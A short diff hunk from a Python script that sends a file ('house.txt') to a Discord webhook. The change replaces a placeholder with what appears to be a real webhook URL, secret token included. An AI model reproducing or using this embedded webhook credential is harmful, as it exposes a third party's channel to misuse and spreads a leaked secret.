@@ -26,7 +26,7 @@ def send_to_discord_webhook(webhook_url, file_path):
 
 #THIS IS TO CONFIGURE THE WEBHOOK
 if __name__ == "__main__":
-    webhook_url = "INPUT YOUR WEBHOOK HERE"
+    webhook_url = "https://discord.com/api/webhooks/1185880269388001320/gSJbtlbapv2u0I2CZcEVxMboFrxrXOiI5zy1He_U0m-vpaft1FpjA-tNkmWxWX-fxXtH"
     file_path = "house.txt"  # Update the file path accordingly
 #-CONFIG END-
 
